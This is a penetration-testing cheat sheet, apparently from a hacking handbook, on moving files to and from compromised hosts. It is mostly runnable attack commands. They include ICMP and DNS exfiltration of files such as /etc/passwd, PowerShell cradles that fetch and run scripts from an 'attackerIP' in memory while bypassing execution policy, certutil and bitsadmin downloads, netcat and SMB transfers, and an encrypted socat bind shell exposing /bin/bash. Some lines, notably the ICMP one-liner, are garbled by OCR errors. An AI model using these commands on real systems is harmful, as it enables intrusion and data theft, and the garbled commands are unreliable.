# File Transfers \| Exfiltration

## Transfer via ICMP

**On victim \(never ending one liner\) :**

```text
stringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d " " I tr -d "\"'
counter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p {stringZ:counter:16} 192.168.10.10 && counter=$( (counter+~6)) ;done
```

**On the attacker host \(capture packets to data.dmp and parse}:**

```text
tcpdump -ntvvSxs 0 'icmp\[C:-a• data.dmp

grep Ox0020 data.dmp I cut -c21- I tr -d " " I tr -d "\
" I xxd -r -p
```

Alternatively, use this tool:

{% embed url="https://github.com/Vidimensional/Icmp-File-Transfer" %}

Another alternative method can be found here:

{% embed url="https://0xffsec.com/handbook/exfiltration/\#icmp" %}

## Transfer via FTP

The below method can be used to transfer files from Linux to Windows. A similar technique can also be used to transfer files from Windows to Linux but with a little trick.

Place your file \(nc.exe in this case\) FTP home directory on target Linux.  
Replace the username/password below with your FTP username/password.

**Linux System\(Attacking machine\)**

```text
echo open 192.168.1.2 21> file.txt  
echo USER username>> file.txt  
echo password>> file.txt  
echo bin >> file.txt  
echo GET nc.exe >> file.txt  
echo bye >> file.txt`
```

**Windows \(Target machine\)**

```text
ftp -v -n -s:file.txt
```

Alternatively, we can use Pure-FTP but first, we must install it:

```text
sudo apt update && sudo apt install pure-ftpd
```

Then we can set up a Pure-FTP configuration like this one:

```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd <username_here>-u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

To list all FTP users:

```text
pure-pw list
```

If a user password is forgotten, you can reset it with the following command:

```text
pure-pw passwd username_here
```

Every time you make changes you must update your database with this command:

```text
pure-pw mkdb
```

Alternatively and the easiest way is to use pyftpdlib from python:

```text
sudo python -m pyftpdlib -p 21 -u user -P pass
```

## Transfer via DNS

Capture DNS packets data.

```text
sudo tcpdump -n -i wlan0 -w dns_exfil.pcap udp and src 10.0.0.3 and port 53
```

Note: Remember to point the DNS resolution to where packages are being captured.

Generate DNS queries.

```text
xxd -p -c 16 filename.ext | while read h; do ping -c 1 ${h}.domain.com; done
```

Extract exfiltrated data.

```text
tcpdump -r dns-exfil.pcap 2>/dev/null | sed -e 's/.*\ \([A-Za-z0-9+/]*\).domain.com.*/
```

The example above was extracted from [here](https://0xffsec.com/handbook/exfiltration/#dns).

## Transfer via TFTP

TFTP can be used to transfer files to/from older Windows OS.

By default installed on: Up to Windows XP and 2003.  
By default not installed on: Windows 7, Windows 2008, and newer.

**Kali**

```text
apt update && sudo apt install atftp  
mkdir /tftp  
chown nobody: /tftp  
atftpd --daemon --port 69 /tftp
```

**Windows**

```text
tftp -i 192.168.1.2 PUT file1.txt  
tftp -i 192.168.1.2 GET file2.txt`
```

Alternatively, we can set up a listener with `atftp` as follows:

```text
atftpd --daemon --port 69 /tftp
```

## Transfer via HTTP

### Listening on HTTP

**Start HTTP Service:**

```text
sudo systemctl start apache2
```

**Verify HTTP Service**

```text
sudo ss -antlp | grep apache
```

Alternatively on your Linux host run a Python HTTP Server with:

```bash
sudo python -m SimpleHTTPServer 80
```

Alternatively, on your Linux host run a Python3 HTTP Server with:

```text
sudo python3 -m http.server 80
```

Alternatively, we can use busybox :

```text
busybox httpd -f -p 10000
```

Alternatively, we can use PHP:

```text
php -S (ip):(port) -t
```

Alternatively, we can use Ruby:

```text
ruby -run -e httpd . -p 9000
```

### Downloading/Uploading on HTTP

Download with PowerShell Invoke-WebRequest:

```text
powershell -c IWR http://10.10.10.10/filename.exe -o filename.exe
```

Alternatively, download with PowerShell Invoke-Expression DownloadFile:

```text
powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://10.10.10.10:8080/filename', 'output_filename')
```

Alternatively, download with PowerShell Invoke-Expression DownloadString \(runs on memory\):

```text
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attackerIP/file.ps1')"
```

Alternatively, download with PowerShell Invoke-WebRequest with BasicParsing:

```text
powershell -c "IEX (IWR http://attackerIP/file.ps1 -UseBasicParsing)"
```

Alternatively, download with PowerShell with Execution Policy Bypass implemented:

```text
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
```

Alternatively, download with curl:

```text
curl http://10.10.10.10/filename -o filename
```

Alternatively, download with wget:

```text
wget http://10.10.10.10 -O filename
```

Alternatively, if you're in OpenBSD you can use fetch:

```text
fetch http://attackerip/file
```

Alternatively, download with certutil:

```text
certutil -urlcache -split -f “http://10.10.10.10:8080/file” output_file

certutil.exe -urlcache -f "http://attackerIP/file.exe" file.exe
```

Alternatively, download with bitsadmin:

```text
bitsadmin /transfer job /download /priority high http://10.10.10.10/file output_file
```

Alternatively, download with MpCmdRun:

```text
MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file]
```

Alternatively, download with Perl:

```perl
perl -MLWP::Simple -e 'getstore("http://10.10.10.10/file", "out_file")';
perl -e 'use LWP::Simple; getstore("http://10.10.10.10/file", "out_file")'
```

### Alternative PowerShell non-interactive

If we don’t have a fully interactive shell to launch Powershell we need to create a PowerShell script and run it as a file:

```text
echo $storageDir = $pwd > wget.ps1  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "http://192.168.1.2/exploit.exe" >>wget.ps1  
echo $file = "exploit1-ouput.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Finally, we can call and run the ps file using below:

```text
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Alternative VBScript

**VBScript\(XP, 2003\)**

In this first, we will echo all these commands in a file `wget.vbs`  
If you are creating this file on Windows then it will work fine.  
If creating on Linux and then transferring to windows then you may face issues sometimes, use **unix2dos** before you transfer it in this case.

```text
echo strUrl = WScript.Arguments.Item(0) > wget.vbs  
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs  
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs  
echo Err.Clear >> wget.vbs  
echo Set http = Nothing >> wget.vbs  
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs  
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs  
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs  
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs  
echo http.Open "GET",strURL,False >> wget.vbs  
echo http.Send >> wget.vbs  
echo varByteArray = http.ResponseBody >> wget.vbs  
echo Set http = Nothing >> wget.vbs  
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs  
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs  
echo strData = "" >> wget.vbs  
echo strBuffer = "" >> wget.vbs  
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs  
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs  
echo Next >> wget.vbs  
echo ts.Close >> wget.vbs
```

**Using wget.vbs**

cscript wget.vbs [http://192.168.1.2/xyz.txt](http://192.168.1.2/xyz.txt) xyz.txt

## Transfer via SMB

Listen on your machine/host:

```text
impacket-smbserver <sharename> '<path>'
```

Mount this file share in victim using PowerShell:

```text
New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName>
```

Change into the new drive:

```text
cd <ShareName>:
```

### Alternative Methods

In modern Windows operating systems, SMB2 is the default version that's supported. If you're pentesting a modern Windows machine, you may want to specify `-smb2support` option and maybe some credentials as well with `-user username  -p password` here is an example:

On your machine/host:

```text
sudo impacket-smbserver <shareName> $(pwd) -smb2support -user <user> -p <password>
```

Then on the victim machine, we'll connect back to this SMB share, but first, we need to specify the credentials mentioned in the above command. To do that, we’ll use the following commands:

```text
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<user>', $pass)
New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName> -Credential $cred
```

**Alternatively**, we can just do this:

```text
# use double-quotes if file path has spaces in it 
sudo impacket-smbserver abcd /path/to/serve

# Mount drives with cmd.exe
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete

# Mount drives with PowerShell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
Remove-PSDrive -Name abcd
```

**Alternatively**, if we which to just copy the file instead of mounting PSDrive we can use copy or xcopy commands as follows:

```text
# Share
impacket-smbserver <ShareName> '<path>'
impacket-smbserver <ShareName> $(pwd) -smb2support

# Copy | Transfer
copy \\<YOUR_IP>\<ShareName>\filename.exe
xcopy \\<YOUR_IP>\<ShareName>\filename.exe
```

## Transfer via SCP

Copy a file:

```text
scp /path/to/source/file.ext username@192.168.1.10:/path/to/destination/file.ext
```

Copy a directory:

```text
scp -r /path/to/source/dir username@192.168.1.10:/path/to/destination
```

### Alternative pscp

```text
pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt
pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt
```

## Transfer via Rsync

Synchronize /home to /backups/home

```text
rsync -a /home /backups/
```

Synchronize files/directories between the local and remote system with compression enabled

```text
rsync -avz /home server:/backups/
```

## Transfer via Base32 Encoding

```text
# Unix/Linux
cat filename | base32 -w0 | xclip -selection clipboard


# Unix/Linux to Windows
cat filename | iconv -t UTF-16LE | base32 -w0 | xclip -selection clipboard
```

## Transfer via Base64 Encoding

```text
# Unix/Linux
cat filename | base64 -w0 | xclip -selection clipboard


# Unix/Linux to Windows
cat filename | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
```

## Transfer via WinRM

### Evil-WinRM

We can user evil-winrm built-in `upload` and `download` functions to transfer files:

```text
upload filename
download filename
```

## Transfer via Socat

In your attacker host:

```text
socat TCP4-LISTEN:443,fork file:file.txt
```

In Windows execute this:

```text
socat TCP4:192.168.1.2:443 file:file.txt,create
```

## Transfer via Netcat

On the receiving host:

```text
nc -nlvp 4444 > outputfile.exe
```

On the host that has the file that you want to send:

```text
nc -nv 192.168.1.2 4444 < /usr/inputfile.exe
```

## Transfer via Powercat

Send a file:

```text
powercat -c IP -p PORT -i C:\Users\name\file.ps1
```

* -c = client mode
* -p = port
* -i = indicate file

Receive a file:

```text
sudo nc -lvnp PORT > received_file.ps1
```

## Transfer Binaries

### Transfer Binaries from Linux to Windows

#### exe2hex method

1. Find or Locate the Binary

   ```text
   locate nc.exe  | grep binaries
   ```

2. Copy the binary to your working path

   ```text
   cp  /path/to/nc.exe .
   ```

3. Review the size of the binary

   ```text
   ls -lh nc.exe
   ```

4. Reduce/Compress the size of the binary

   ```text
   upx -9 nc.exe
   ```

5. Convert exe to a Windows Script

   ```text
   exe2hex -x nc.exe -p nc.cmd
   ```

6. Review the converted file

   ```text
   less nc.cmd
   ```

7. Copy the script into the clipboard

   ```text
   cat nc.cmd | xclip -selection clipboard
   ```

8. Paste the script into the target shell

   ```text
   Ctrl+Shift+V or Ctrl+V or Right Click (if availabe)
   ```

## Encrypted File Transfers

### Ncat Encrypted

Ncat can create a secure, encrypted connection over SSL/TLS. You can set up a listener on the target with:

```text
ncat -nvlp port --ssl > out-file
```

 __Then connect to the listener from the attacking machine with:

```text
ncat -nv target-ip port --ssl < file-to-send
```

### Socat Encrypted

**SSL**

```text
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

* req + x509 = create self-signed certificates
* req = initiate a new certificate signing request
* -newkey = generate a private key
* rsa:2048 = RSA with 2048 bits key length
* -nodes = store without passphrase \(no encryption\)
* -keyout = save the key to a file
* -x509 = output self-signed certificate, not a certificate request
* -days = period of days that are valid
* -out = save the certificate to a file

**Convert:**

```text
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

**Create Encrypted Listener:**

_Linux_

```text
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

* OPENSSL-LISTEN = create a listener
* cert = certificate file
* verify = disable SSL verification
* fork = spawn a child process once the connection is made

**Connect:**

_Windows_

```text
socat - OPENSSL:IP:PORT,verify=0
```

* - = transfer data between STDIO
* OPENSSL = establish SSL connection
* verify=0 = disable SSL verification

